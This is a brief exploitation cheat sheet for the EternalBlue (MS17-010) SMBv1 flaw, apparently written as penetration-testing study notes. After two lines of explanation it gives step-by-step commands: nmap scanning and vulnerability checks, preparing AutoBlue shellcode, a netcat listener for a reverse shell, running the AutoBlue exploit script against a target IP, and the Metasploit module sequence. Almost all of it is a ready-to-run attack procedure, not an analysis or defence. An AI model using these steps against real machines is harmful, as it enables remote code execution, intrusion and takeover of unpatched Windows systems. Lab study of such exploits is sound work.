- The EternalBlue vulnerability allows attackers to remotely execute arbitrary code and gain access to a Windows system.
- The EternalBlue exploit takes advantage of a vulnerability in the Windows SMBv1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands.

## Practical
##### Scan the Target
```
nmap -p445 -sV -O IP
```

##### Check the Target for Vulnerability
```
nmap -p445 -sV --script smb-vuln-ms17-010 IP
```

### Manual Exploit using AutoBlue-MS17-010
For this exploit to work we need to setup the ***requirements*** and ***shell code***:
```
clone the github repository
cd shellcode
chmod +x shell_prep.sh
./shell_prep.sh
```

Now that the shellcode is setup, we can start the `nc` listener:
```
nc -nvlp 4444
```

Now, we can began with the actual exploit:
```
chmod +x eternalblue_exploit7.py
./eternalblue_exploit7.py target_IP shellcode/sc_x64.bin
```

### Metasploit
```
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set rhosts IP
run
```
